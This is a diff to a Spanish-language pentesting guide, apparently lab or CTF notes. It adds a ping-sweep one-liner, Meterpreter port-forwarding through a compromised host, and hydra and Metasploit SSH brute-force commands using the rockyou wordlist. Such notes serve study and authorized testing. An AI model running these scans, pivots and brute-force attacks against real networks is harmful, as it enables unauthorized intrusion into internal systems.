@@ -48,6 +48,14 @@ run
 
 ### Con Script de Bash
 
+Ping sweep con one liner:
+
+```shell
+for i in {1..254}; do (ping -c 1 -W 1 <192.168.1>.$i | grep "bytes frome" &) ;done
+```
+
+### Con Script de Bash
+
 Crear un script `scanner.sh` en nuestra maquina:
 
 ```bash
@@ -84,7 +92,7 @@ run
 
 Redirige puertos de la maquina interna hacia nuestra maquina atacante.
 
-```bash
+```meterpreter
 session -i 1
 portfwd add -l 222 -p 22 -r <IP_maquina_interna>
 ```
@@ -95,14 +103,29 @@ Ahora podemos conectarnos como si el servicio estuviera en local:
 ssh usuario@127.0.0.1 -p 222
 ```
 
-```bash
+```meterpreter
 portfwd add -l 5000 -p 80 -r <IP_maquina_final>
+portfwd
 ```
 
 > Ahora `http://127.0.0.1:5000` muestra el servicio web de la maquina interna.
 
 ## 7. Fuerza Bruta contra Servicio Pivoteado
 
+Fuerza Bruta a Contraseñas o Usuarios
+
 ```bash
 hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1 -s 222
+hydra -L <diccionario> -p <password> ssh://127.0.0.1 -s 222
 ```
+
+Fuerza Bruta con msf6 en máquina remota:
+
+```msf6
+use scanner/ssh/ssh_login
+set PASS_FILE /usr/share/wordlist/rockyou.txt
+set RHOST <IP_objetivo_red_interna>
+set username <root>    #nombre común
+```
+> Crea una nueva sesión de ssh que se puede abrir con `session -i <ID_session>`
+
